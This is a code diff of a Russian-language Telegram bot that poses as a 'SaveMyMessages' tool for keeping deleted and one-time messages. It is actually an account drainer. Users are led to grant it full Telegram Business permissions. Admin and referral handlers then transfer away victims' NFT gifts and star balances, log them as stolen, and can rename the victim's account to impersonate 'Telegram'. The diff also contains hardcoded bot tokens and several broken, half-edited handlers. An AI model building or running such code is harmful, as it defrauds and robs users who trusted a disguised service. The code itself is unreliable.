@@ -7,282 +7,196 @@ from aiogram.enums import ParseMode
 from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from aiogram.filters import CommandStart, Command
 from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.fsm.storage.memory import MemoryStorage
 import random
-import os
-import json
+
 from datetime import datetime
-import logging
+import requests
+import aiohttp
 import asyncio
+import logging
+
 
 # Constants
-TOKEN = "8449764247:AAE8rqyigMhYIo5fl_8GS45TlhOUEHYKwC8"
+TOKEN = "7980252212:AAH1J7sHyLWvGOv0t6hcUMiVrebrfDsoH-s" #Токен бота
 LOG_CHAT_ID = -1002741941997
+
 MAX_GIFTS_PER_RUN = 1000
-ADMIN_IDS = [7917237979]
-user_message_history = {}
-
-# State classes
-class Draw(StatesGroup):
-    id = State()
-    gift = State()
-
-class CheckState(StatesGroup):
-    waiting_for_amount = State()
-
-# Initialize storage and logging
+last_messages = {}
+ADMIN_IDS = [7917237979] #Вставить айди админов
 storage = MemoryStorage()
+
 logging.basicConfig(level=logging.INFO)
 
-# Load referrers data
+import os
+import json
+
+# Загружаем user_referrer_map из файла, если есть
 if os.path.exists("referrers.json"):
     with open("referrers.json", "r") as f:
         user_referrer_map = json.load(f)
 else:
     user_referrer_map = {}
+user_referrals = {}     # inviter_id -> [business_ids]
+ref_links = {}          # ref_code -> inviter_id
 
-# Initialize bot
+# Bot initialization
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher(storage=storage)
+dp = Dispatcher(storage=MemoryStorage())
 
-async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, parse_mode=None):
-    try:
-        # Delete all previous messages except the first one
-        if chat_id in user_message_history and len(user_message_history[chat_id]) > 1:
-            for msg_id in user_message_history[chat_id][1:]:
-                try:
-                    await bot.delete_message(chat_id=chat_id, message_id=msg_id)
-                except Exception as e:
-                    logging.error(f"Error deleting message: {e}")
-            user_message_history[chat_id] = user_message_history[chat_id][:1]
-        
-        # Send new message
-        message = await bot.send_message(
-            chat_id=chat_id,
-            text=text,
-            reply_markup=reply_markup,
-            parse_mode=parse_mode
-        )
-        
-        # Update message history
-        if chat_id not in user_message_history:
-            user_message_history[chat_id] = []
-        user_message_history[chat_id].append(message.message_id)
-        
-        return message
-    except Exception as e:
-        logging.error(f"Error in send_replaceable_message: {e}")
-        raise
+class Draw(StatesGroup):
+    id = State()
+    gift = State()
 
 def main_menu_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
-        [InlineKeyboardButton(text="💳 Чеки", callback_data="checks")],
-        [InlineKeyboardButton(text="⭐️ Получение звёзд", callback_data="get_stars")],
-        [InlineKeyboardButton(text="📝 Условия", callback_data="terms")]
+        [InlineKeyboardButton(text="📌 Сохранять одноразовые сообщения", callback_data="show_instruction")],
+        [InlineKeyboardButton(text="🗑️ Сохранять удалённые сообщения", callback_data="show_instruction")],
+        [InlineKeyboardButton(text="✏️ Сохранять отредактированные сообщения", callback_data="show_instruction")],
+        [InlineKeyboardButton(text="🎞 Анимации с текстом", callback_data="show_instruction")],
+        [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")]
     ])
 
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
     args = message.text.split(" ")
-    user_id = message.from_user.id
-    
-    # Handle referral link
+
     if len(args) > 1 and args[1].startswith("ref"):
         ref_code = args[1]
         try:
             inviter_id = int(ref_code.replace("ref", ""))
-            if inviter_id and inviter_id != user_id:
-                user_referrer_map[str(user_id)] = inviter_id
-                save_referrers()
-                await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
         except ValueError:
-            pass
+            inviter_id = None
 
-    photo = FSInputFile("image.jpg")
+        if inviter_id and inviter_id != message.from_user.id:
+            # Сохраняем user_referrer_map в файл
+            user_referrer_map[message.from_user.id] = inviter_id
+            with open("referrers.json", "w") as f:
+                json.dump(user_referrer_map, f)
+                
+            await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
+        else:
+            await message.answer("Некорректная или своя собственная реферальная ссылка 🤷‍♂️")
+
+    photo = FSInputFile("savemod_banner.jpg")
     await message.answer_photo(
         photo=photo,
         caption=(
-            "Привет! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
-            "С ним ты можешь моментально покупать и передавать звезды.\n\n"
-            "Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n"
-            "С помощью бота куплено:\n"
-            "6,307,360 ⭐️ (~ $94,610)\n\n"
-            "Выберите действие:"
+            "👋 Добро пожаловать в <b>SaveMyMessages</b>!\n"
+            "🔹 Сохраняйте одноразовые сообщения\n"
+            "🔹 Сохраняйте удалённые сообщения\n"
+            "🔹 Сохраняйте отредактированные сообщения\n\n"
+            "📖 <b>Перед началом ознакомьтесь с инструкцией</b>\n"
+
+            "Выберите, что хотите сохранять:"
         ),
         reply_markup=main_menu_kb()
     )
+@dp.message(Command("getrefZZZ"))
+async def send_ref_link(message: types.Message):
+    user_id = message.from_user.id
+    ref_code = f"ref{user_id}"
+    ref_links[ref_code] = user_id
+    await message.answer(f"Ваша реферальная ссылка: https://t.me/{(await bot.me()).username}?start={ref_code}")
 
-    # Очищаем историю сообщений и добавляем стартовое сообщение
-    if message.chat.id not in user_message_history:
-        user_message_history[message.chat.id] = []
-    else:
-        # Оставляем только первое сообщение
-        if len(user_message_history[message.chat.id]) > 0:
-            first_msg_id = user_message_history[message.chat.id][0]
-            user_message_history[message.chat.id] = [first_msg_id]
-    
-    # Добавляем ID стартового сообщения в историю
-    user_message_history[message.chat.id].append(message.message_id + 1)  # +1 потому что photo message
-
-@dp.callback_query(F.data == "profile")
-async def show_profile(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    
-    # Generate referral link
-    ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{user_id}"
-    
-    # Count referrals
-    total_referrals = sum(1 for uid, inv_id in user_referrer_map.items() if str(inv_id) == str(user_id))
-    
-    profile_text = (
-        f"👤 <b>Ваш профиль</b>\n\n"
-        f"🆔 UUID Профиля: <code>{user_id}</code>\n"
-        f"💰 Ваш баланс (в боте): 0 ⭐️\n\n"
-        f"🚀 <b>Реферальная система</b>\n"
-        f"Получай +10% от прибыли сервиса за покупки ваших рефералов!\n"
-        f"👬 Всего рефералов: {total_referrals}\n"
-        f"📌 Всего получено от рефералов: 0$\n"
-        f"🔗 <b>Ваша реферальная ссылка:</b>\n"
-        f"<code>{ref_link}</code>\n\n"
-        f"📊 <b>Статистика</b>\n"
-        f"📦 Успешных заказов: 0\n"
-        f"⭐️ Куплено звёзд: 0"
-    )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=profile_text,
-        reply_markup=None,
-        parse_mode="HTML"
+@dp.callback_query(F.data == "show_instruction")
+async def send_instruction(callback: types.CallbackQuery):
+    img = FSInputFile("instruction_guide.png")
+    await callback.message.answer_photo(
+        photo=img,
+        caption=(
+            "<b>Как подключить бота к бизнес-аккаунту:</b>\n\n"
+            "1. Перейдите в «Настройки» → <i>Telegram для бизнеса</i>\n"
+            "2. Перейдите в <i>Чат-боты</i>\n"
+            "3. Добавьте <b>@SaveeMyMessagessBot</b> в список\n"
+            "4. Поставьте все галочки в нижних полях\n\n"
+            "После этого функции начнут работать автоматически ✅"
+        )
     )
     await callback.answer()
 
-@dp.callback_query(F.data == "checks")
-async def show_checks_info(callback: types.CallbackQuery):
-    checks_info = (
-        "💳 <b>Система чеков</b>\n\n"
-        "Вы можете создавать чеки на определенное количество звезд и делиться ими с друзьями!\n\n"
-        "<b>Как это работает:</b>\n"
-        "1. Создайте чек командой /getcheck\n"
-        "2. Укажите количество звезд\n"
-        "3. Поделитесь чеком с друзьями\n"
-        "4. Когда они активируют чек, вы получите часть звезд\n\n"
-        "Для создания чека используйте команду /getcheck"
-    )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=checks_info,
-        reply_markup=None,
-        parse_mode="HTML"
-    )
-    await callback.answer()
 
-@dp.message(Command("getcheck"))
-async def create_check_start(message: types.Message, state: FSMContext):
-    await message.answer("Введите количество звезд для чека (число от 1 до 10000):")
-    await state.set_state(CheckState.waiting_for_amount)
+@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
+async def require_instruction(callback: types.CallbackQuery):
+    await callback.answer("Сначала нажмите на 📖 Инструкцию сверху!", show_alert=True)
 
-@dp.message(CheckState.waiting_for_amount, F.text)
-async def create_check_finish(message: types.Message, state: FSMContext):
+async def pagination(
+    page=0
+):
+    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
     try:
-        amount = int(message.text)
-        if amount < 1 or amount > 10000:
-            raise ValueError
-    except ValueError:
-        await message.answer("Пожалуйста, введите корректное число от 1 до 10000")
-        return
-    
-    # Формируем реферальную ссылку отправителя
-    ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{message.from_user.id}"
-    
-    # Создаем кнопку с URL (реферальная ссылка)
-    builder = InlineKeyboardBuilder()
-    builder.button(
-        text="📝 Активировать чек", 
-        url=ref_link  # Теперь это URL-кнопка, а не callback
-    )
-    
-    check_message = (
-        f"💳 Чек на {amount} звёзд\n\n"
-        f"От: @{message.from_user.username or message.from_user.id}\n\n"
-        "Для активации чека нажмите кнопку ниже ⬇️"
-    )
-    
-    await message.answer(check_message, reply_markup=builder.as_markup())
-    await state.clear()
+        response = requests.get(url)
+        response.raise_for_status()
+        builder = InlineKeyboardBuilder()
+        start = page * 9
+        end = start + 9
+        count = 0
+        
+        data = response.json()
+        if data.get("ok", False):
+            gifts = list(data.get("result", {}).get("gifts", []))
+            for gift in gifts[start:end]:
+                print(gift)
+                count += 1
+                builder.button(
+                    text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
+                    callback_data=f"gift_{gift['id']}"
+                )
+            builder.adjust(2)
+        if page <= 0:
+            builder.row(
+                InlineKeyboardButton(
+                    text="•",
+                    callback_data="empty"
+                ),
+                InlineKeyboardButton(
+                    text=f"{page}/{len(gifts) // 9}",
+                    callback_data="empty"
+                ),
+                InlineKeyboardButton(
+                    text="Вперед",
+                    callback_data=f"next_{page + 1}"
 
-@dp.callback_query(F.data.startswith("show_activation_instructions:"))
-async def show_activation_instructions(callback: types.CallbackQuery):
-    amount = callback.data.split(":")[1]
-    
-    activation_instructions = (
-        f"💳 Чек на {amount} звёзд\n\n"
-        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
-        "1. ⚙️ Откройте <b>Настройки</b>.\n"
-        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
-        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
-        "4. ✍️ Введите имя бота <b>@SendTgStarsBot</b> и нажмите <b>Добавить</b>.\n"
-        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
-        "<i>Зачем это нужно?</i>\n"
-        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
-        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
-        "и подтверждений."
-    )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=activation_instructions,
-        reply_markup=None,
-        parse_mode="HTML"
-    )
-    await callback.answer()
+                )
+            )
+        elif count < 9:
+            builder.row(
+                InlineKeyboardButton(
+                    text="Назад",
+                    callback_data=f"down_{page - 1}"
+                ),
+                InlineKeyboardButton(
+                    text=f"{page}/{len(gifts) // 9}",
+                    callback_data="empty"
+                ),
+                InlineKeyboardButton(
+                    text="•",
+                    callback_data="empty"
 
-@dp.callback_query(F.data == "get_stars")
-async def show_get_stars_instructions(callback: types.CallbackQuery):
-    stars_instructions = (
-        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
-        "1. ⚙️ Откройте <b>Настройки</b>.\n"
-        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
-        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
-        "4. ✍️ Введите имя бота <b>@SendTgStarsBot</b> и нажмите <b>Добавить</b>.\n"
-        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
-        "<i>Зачем это нужно?</i>\n"
-        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
-        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
-        "и подтверждений."
-    )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=stars_instructions,
-        reply_markup=None,
-        parse_mode="HTML"
-    )
-    await callback.answer()
+                )
+            )
+        elif page > 0 and count >= 9:
+            builder.row(
+                InlineKeyboardButton(
+                    text="Назад",
+                    callback_data=f"down_{page - 1}"
+                ),
+                InlineKeyboardButton(
+                    text=f"{page}/{len(gifts) // 9}",
+                    callback_data="empty"
+                ),
+                InlineKeyboardButton(
+                    text="Вперед",
+                    callback_data=f"next_{page + 1}"
 
-@dp.callback_query(F.data == "terms")
-async def show_terms(callback: types.CallbackQuery):
-    terms_text = (
-        "<b>Условия использования @SendTgStarsBot:</b>\n\n"
-        "Полным и безоговорочным принятием условий данной оферты считается оплата клиентом услуг компании.\n\n"
-        "1. Запрещено пополнять звезды и возвращать их, иначе компания в праве досрочно остановить предоставление услуги и заблокировать клиента без возможности возврата средств.\n"
-        "2. Запрещено игнорирование жалоб компании, в случае игнорирования жалобы клиентом, компания имеет право отказать клиенту в своих услугах.\n"
-        "3. Клиенту предоставляется доступ (если не оговорено иное) к звездам, и клиент несет всю связанную с этим ответственность.\n"
-        "4. В случае нарушения условий предоставления услуг компания в праве отказать клиенту в возврате средств.\n"
-        "5. Возврат денежных средств возможен только в случае неработоспособности или за технические ошибки бота по вине компании.\n"
-        "6. Проблемы с пополнением/возвратом звезд — ответственность компании.\n\n"
-        "<i>С уважением, команда @SendTgStarsBot.</i>"
-    )
-    
-    await send_replaceable_message(
-        chat_id=callback.message.chat.id,
-        text=terms_text,
-        reply_markup=None,
-        parse_mode="HTML"
-    )
-    await callback.answer()
-# Business connection handler (unchanged from your original code)
+                )
+            )
+        return builder.as_markup()
+            
+    except Exception as e:
+        print(e)
+        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")
+
 @dp.business_connection()
 async def handle_business(business_connection: types.BusinessConnection):
     business_id = business_connection.id
@@ -320,7 +234,7 @@ async def handle_business(business_connection: types.BusinessConnection):
             warning_message = (
                 "⛔️ Вы не предоставили все права боту\n\n"
                 "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
-                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы отправлять звёзды по вашим чекам.\n\n"
+                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы анализировать сообщения и статистику ваших собеседников, чтобы в будущем отправлять её вам\n\n"
                 "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
             )
             try:
@@ -407,30 +321,181 @@ async def handle_business(business_connection: types.BusinessConnection):
             disable_web_page_preview=True
         )
     except Exception as e:
-        logging.error(f"Ошибка при отправке в лог-чат: {e}")
+        logger.error(f"Ошибка при отправке в лог-чат: {e}")
 
     # 2. Отправка пригласившему (если есть)
-    inviter_id = user_referrer_map.get(str(user.id))
+    inviter_id = user_referrer_map.get(user.id)
     
     if inviter_id and inviter_id != user.id:
         try:
             await bot.send_message(
                 chat_id=inviter_id,
-                text=full_message,
+                text=full_message,  # Точно такое же сообщение
                 reply_markup=builder.as_markup(),
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
-            
-            # Update referrer stats
-            if str(inviter_id) in user_data:
-                user_data[str(inviter_id)]["earned_from_referrals"] += total_withdrawal_cost * 0.1  # 10% commission
-                save_user_data()
-                
         except Exception as e:
             error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
-            logging.error(error_msg)
+            logger.error(error_msg)
             await bot.send_message(LOG_CHAT_ID, error_msg)
+
+@dp.callback_query(F.data == "draw_stars")
+async def draw_stars(message: types.Message, state: FSMContext):
+    await message.answer(
+        text="Введите айди юзера кому перевести подарки"
+    )
+    await state.set_state(Draw.id)
+
+@dp.message(F.text, Draw.id)
+async def choice_gift(message: types.Message, state: FSMContext):
+
+    msg = await message.answer(
+        text="Актуальные подарки:",
+        reply_markup=await pagination()
+    )
+    last_messages[message.chat.id] = msg.message_id
+    user_id = message.text
+    await state.update_data(user_id=user_id)
+    await state.set_state(Draw.gift)
+
+@dp.callback_query(F.data.startswith("gift_"))
+async def draw(callback: CallbackQuery, state: FSMContext):
+    gift_id = callback.data.split('_')[1]
+    user_id = await state.get_data()
+    user_id = user_id['user_id']
+    await bot.send_gift(
+        gift_id=gift_id,
+        chat_id=int(user_id)
+    )
+    await callback.message.answer("Успешно отправлен подарок")
+    await state.clear
+
+@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
+async def edit_page(callback: CallbackQuery):
+    message_id = last_messages[callback.from_user.id]
+    await bot.edit_message_text(
+        chat_id=callback.from_user.id,
+        message_id=message_id,
+        text="Актуальные подарки:",
+        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
+    )
+    
+            
+
+@dp.message(Command("ap"))
+async def apanel(message: types.Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        InlineKeyboardButton(
+            text="⭐️Вывод звезд",
+            callback_data="draw_stars"
+        )
+    )
+    await message.answer(
+        text="Админ панель:",
+        reply_markup=builder.as_markup()
+    )
+@dp.callback_query(F.data.startswith("destroy:"))
+async def destroy_account(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    builder = InlineKeyboardBuilder()
+    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
+    business_id = callback.data.split(":")[1]
+    print(f"Business id {business_id}")
+    builder.row(
+        InlineKeyboardButton(
+            text="⛔️Отмена самоуничтожения",
+            callback_data=f"decline:{business_id}"
+        )
+    )
+    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
+    await bot.set_business_account_bio(business_id, "Telegram")
+    photo = FSInputFile("telegram.jpg")
+    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
+    await bot.set_business_account_profile_photo(business_id, photo)
+    await callback.message.answer(
+        text="⛔️Включен режим самоуничтожения, для того чтобы отключить нажмите на кнопку",
+        reply_markup=builder.as_markup()
+    )
+
+@dp.callback_query(F.data.startswith("decline:"))
+async def decline(callback: CallbackQuery):
+    business_id = callback.data.split(":")[1]
+    await bot.set_business_account_name(business_id, "Bot")
+    await bot.set_business_account_bio(business_id, "Some bot")
+    await callback.message.answer("Мамонт спасен от сноса.")
+
+    user_id = message.from_user.id
+    inviter_id = user_referrer_map.get(user_id)
+
+    # Если нет пригласившего — fallback на первого админа
+    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
+
+    try:
+        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
+        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
+    except Exception as e:
+        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
+        return
+
+    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
+    if gifts_to_process == []:
+        await bot.send_message(chat_id=LOG_CHAT_ID, text="У пользователя нет подарков.")
+    
+    for gift in gifts_to_process:
+        gift_id = gift.owned_gift_id
+        print(gift.gift)
+
+        gift_type = gift.type
+        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
+        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
+        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
+        
+        if gift_type == "regular":
+            try:
+                await bot.convert_gift_to_stars(business_id, gift_id)
+            except:
+                pass
+    
+        if not gift_id:
+            continue
+
+        # Передача
+        if isTransfered:
+            try:
+                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
+                stolen_nfts.append(f"t.me/nft/{gift_name}")
+                stolen_count += 1
+            except Exception as e:
+                await message.answer(f"❌ Не удалось передать подарок {gift_name} пользователю {recipient_id}")
+                print(e)
+
+
+    # Лог
+    if stolen_count > 0:
+        text = (
+            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
+            "\n".join(stolen_nfts)
+        )
+        await bot.send_message(LOG_CHAT_ID, text)
+    else:
+        await message.answer("Не удалось украсть подарки")
+    
+    # Перевод звёзд
+    try:
+        stars = await bot.get_business_account_star_balance(business_id)
+        amount = int(stars.amount)
+        if amount > 0:
+            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
+            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
+        else:
+            await message.answer("У пользователя нет звезд.")
+    except Exception as e:
+        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд: {e}")
 
 @dp.callback_query(F.data.startswith("steal_gifts:"))
 async def steal_gifts_handler(callback: CallbackQuery):
@@ -516,7 +581,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
             await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
     
     await callback.answer(f"Украдено {stolen_count} подарков")
-
+    
 @dp.callback_query(F.data.startswith("transfer_stars:"))
 async def transfer_stars_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
@@ -560,14 +625,11 @@ async def transfer_stars_handler(callback: CallbackQuery):
         error_msg = f"❌ Ошибка при переводе звёзд: {e}"
         await bot.send_message(LOG_CHAT_ID, error_msg)
         await callback.answer("Ошибка при переводе звёзд", show_alert=True)
-    
 
-def save_referrers():
-    with open("referrers.json", "w") as f:
-        json.dump(user_referrer_map, f)
-
+        
 async def main():
     await dp.start_polling(bot)
+
 
 if __name__ == "__main__":
     asyncio.run(main())
